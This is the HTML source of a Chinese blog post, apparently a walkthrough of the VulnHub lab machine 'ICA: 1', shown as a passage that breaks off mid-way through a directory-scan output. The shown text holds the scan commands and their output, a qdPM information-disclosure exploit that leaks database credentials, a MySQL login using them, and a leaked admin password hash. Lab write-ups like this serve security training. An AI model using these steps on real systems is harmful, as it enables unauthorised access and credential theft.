@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICA: 1">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/04/18/ICA%201/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-18T03:10:17.000Z">
+<meta property="article:modified_time" content="2024-04-18T06:30:49.902Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="Vulnhub 靶场">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="shell">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/04/18/ICA%201/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/04/18/ICA%201/","path":"2024/04/18/ICA 1/","title":"ICA: 1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ICA: 1 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get_access-%E6%BA%90%E7%A0%81"><span class="nav-text">3.2. get_access 源码</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">122</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">50</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/04/18/ICA%201/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ICA: 1 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ICA: 1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-04-18 11:10:17 / 修改时间：14:30:49" itemprop="dateCreated datePublished" datetime="2024-04-18T11:10:17+08:00">2024-04-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>9 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ica-1,748/">ICA: 1 ~
+VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts             </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240       </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.           </span><br><span class="line">192.168.159.153 00:0c:29:<span class="built_in">fc</span>:<span class="built_in">fc</span>:1f      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.254 00:50:56:fa:94:af      1      60  VMware, Inc. </span><br></pre></td></tr></table></figure>
+<p>靶机：192.168.159.153</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-17 07:38 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.153</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)</span><br><span class="line">|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)</span><br><span class="line">|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:<span class="built_in">cd</span>:7b:8e (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.48 ((Debian))</span><br><span class="line">|_http-title: qdPM | Login</span><br><span class="line">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="line">3306/tcp  open  mysql   MySQL 8.0.26</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 8.0.26</span><br><span class="line">|   Thread ID: 40</span><br><span class="line">|   Capabilities flags: 65535</span><br><span class="line">|   Some Capabilities: Speaks41ProtocolOld, LongColumnFlag, Support41Auth, SupportsTransactions, FoundRows, IgnoreSigpipes, LongPassword, SupportsCompression, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, ODBCClient, InteractiveClient, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: &amp;\x7FDO\x1CR)-\x1F&amp;%eO\x07\x02B\x1F@Dk</span><br><span class="line">|_  Auth Plugin Name: caching_sha2_password</span><br><span class="line">| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate</span><br><span class="line">| Not valid before: 2021-09-25T10:47:29</span><br><span class="line">|_Not valid after:  2031-09-23T10:47:29</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message<span class="string">&quot;</span></span><br><span class="line"><span class="string">|     HY000</span></span><br><span class="line"><span class="string">|   LDAPBindReq: </span></span><br><span class="line"><span class="string">|     *Parse error unserializing protobuf message&quot;</span></span><br><span class="line">|     HY000</span><br><span class="line">|   oracle-tns: </span><br><span class="line">|     Invalid message-frame.<span class="string">&quot;</span></span><br><span class="line"><span class="string">|_    HY000</span></span><br><span class="line"><span class="string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">SF-Port33060-TCP:V=7.94%I=7%D=4/17%Time=661FB4DD%P=x86_64-pc-linux-gnu%r(N</span></span><br><span class="line"><span class="string">SF:ULL,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(GenericLines,9,&quot;</span>\x05\0\0\0\x0b\</span><br><span class="line">SF:x08\x05\x1a\0<span class="string">&quot;)%r(GetRequest,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(HTTPOp</span></span><br><span class="line"><span class="string">SF:tions,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(RTSPRequest,9,&quot;</span>\x05\0\0\0\x0b</span><br><span class="line">SF:\x08\x05\x1a\0<span class="string">&quot;)%r(RPCCheck,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(DNSVers</span></span><br><span class="line"><span class="string">SF:ionBindReqTCP,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(DNSStatusRequestTCP,2</span></span><br><span class="line"><span class="string">SF:B,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x0fI</span></span><br><span class="line"><span class="string">SF:nvalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)</span></span><br><span class="line"><span class="string">SF:%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01</span></span><br><span class="line"><span class="string">SF:\x10\x88&#x27;</span>\x1a\x0fInvalid\x20message\&quot;\x05HY000<span class="string">&quot;)%r(TerminalServerCookie</span></span><br><span class="line"><span class="string">SF:,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(TLSSessionReq,2B,&quot;</span>\x05\0\0\0\x0b\x</span><br><span class="line">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x0fInvalid\x20message\&quot;</span></span><br><span class="line"><span class="string">SF:\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9</span></span><br><span class="line"><span class="string">SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\</span></span><br><span class="line"><span class="string">SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#x27;</span>\x1a\x0fInvalid\x20message\&quot;\x05HY0</span><br><span class="line">SF:00<span class="string">&quot;)%r(FourOhFourRequest,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(LPDString,</span></span><br><span class="line"><span class="string">SF:9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(LDAPSearchReq,2B,&quot;</span>\x05\0\0\0\x0b\x0</span><br><span class="line">SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x0fInvalid\x20message\&quot;\</span></span><br><span class="line"><span class="string">SF:x05HY000&quot;)%r(LDAPBindReq,46,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\</span></span><br><span class="line"><span class="string">SF:x08\x01\x10\x88&#x27;</span>\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me</span><br><span class="line">SF:ssage\&quot;\x05HY000<span class="string">&quot;)%r(SIPOptions,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(LAN</span></span><br><span class="line"><span class="string">SF:Desk-RC,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(TerminalServer,9,&quot;</span>\x05\0\0\</span><br><span class="line">SF:0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(NCP,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0<span class="string">&quot;)%r(NotesRP</span></span><br><span class="line"><span class="string">SF:C,2B,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88<span class="string">&#x27;\x1a\x</span></span><br><span class="line"><span class="string">SF:0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x</span></span><br><span class="line"><span class="string">SF:1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,32,&quot;</span></span><br><span class="line"><span class="string">SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&#x27;</span>\x1a\x16Invalid</span><br><span class="line">SF:\x20message-frame\.\&quot;\x05HY000<span class="string">&quot;)%r(ms-sql-s,9,&quot;</span>\x05\0\0\0\x0b\x08\x05\x</span><br><span class="line">SF:1a\0<span class="string">&quot;)%r(afp,2B,&quot;</span>\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10</span><br><span class="line">SF:\x88<span class="string">&#x27;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;);</span></span><br><span class="line"><span class="string">MAC Address: 00:0C:29:FC:FC:1F (VMware)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.8</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   1.46 ms 192.168.159.153</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 32.44 seconds</span></span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 部署了项目管理系统 qdPM 【9.2】，扫目录并找找历史漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.153&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json,html -f -t 50</span><br><span class="line"></span><br><span class="line">searchsploit qdpm</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180900435.png" /></p>
+<p>有个信息泄露的漏洞</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180902282.png" /></p>
+<p>得数据库配置信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">all:</span><br><span class="line">  doctrine:</span><br><span class="line">    class: sfDoctrineDatabase</span><br><span class="line">    param:</span><br><span class="line">      dsn: <span class="string">&#x27;mysql:dbname=qdpm;host=localhost&#x27;</span></span><br><span class="line">      profiler: <span class="literal">false</span></span><br><span class="line">      username: qdpmadmin</span><br><span class="line">      password: <span class="string">&quot;&lt;?php echo urlencode(&#x27;UcVQCMQk2STVeS6J&#x27;) ; ?&gt;&quot;</span></span><br><span class="line">      attributes:</span><br><span class="line">        quote_identifier: <span class="literal">true</span>  </span><br></pre></td></tr></table></figure>
+<p>靶机开了 3306，直接尝试登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.159.153  -uqdpmadmin -pUcVQCMQk2STVeS6J -Dqdpm</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180903455.png" /></p>
+<p>找到了 qdPM 登录所需的用户信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">$P<span class="variable">$Ed22H8i1lt1q</span>/v.8d.FhKU1PyoQws2.</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180903456.png" /></p>
+<p>利用 john 破解password 未果！或许可以直接换个密码【操作见 3.1】</p>
+<p>目录扫描结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.159.153/</span><br><span class="line"></span><br><span class="line">[10:04:35] Starting: </span><br><span class="line">[10:04:35] 200 -    2KB - /images/                                         </span><br><span class="line">[10:04:35] 301 -  319B  - /images  -&gt;  http://192.168.159.153/images/      </span><br><span class="line">[10:04:36] 403 -  280B  - /icons/                                          </span><br><span class="line">[10:04:36] 200 -    6KB - /index.php                                       </span><br><span class="line">[10:04:37] 301 -  320B  - /uploads  -&gt;  http://192.168.159.153/uploads/    </span><br><span class="line">[10:04:37] 200 -    1KB - /uploads/                                        </span><br><span class="line">[10:04:42] 301 -  316B  - /css  -&gt;  http://192.168.159.153/css/            </span><br><span class="line">[10:04:42] 200 -    1KB - /css/                                            </span><br><span class="line">[10:04:42] 301 -  321B  - /template  -&gt;  http://192.168.159.153/template/  </span><br><span class="line">[10:04:42] 200 